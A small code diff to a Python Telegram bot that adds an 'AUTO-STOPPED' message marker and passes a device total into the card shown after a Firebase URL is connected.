@@ -306,6 +306,7 @@ def _is_virtus_bot_message(text: str) -> bool:
         "Real SMS ->",
         "Virtus Auto Token",
         "Test message sent:",
+        "AUTO-STOPPED",
         "✅ SUCCESS",
     )
     return any(marker in text for marker in markers)
@@ -487,7 +488,7 @@ async def setfirebase_command(update: Update, context: ContextTypes.DEFAULT_TYPE
     db: Session = SessionLocal()
     device = None
     try:
-        profile, _total, online_count = await connect_firebase_url(db, user.id, firebase_url)
+        profile, total, online_count = await connect_firebase_url(db, user.id, firebase_url)
         if profile.active_device_id:
             device = db.query(Device).filter(Device.id == profile.active_device_id).first()
     except ValueError as exc:
@@ -502,7 +503,7 @@ async def setfirebase_command(update: Update, context: ContextTypes.DEFAULT_TYPE
 
     await sync_profile_to_firebase(profile, device)
     await status_msg.edit_text(
-        format_firebase_connected_card(profile.firebase_url or firebase_url, online_count),
+        format_firebase_connected_card(profile.firebase_url or firebase_url, online_count, total),
         parse_mode="HTML",
     )
 
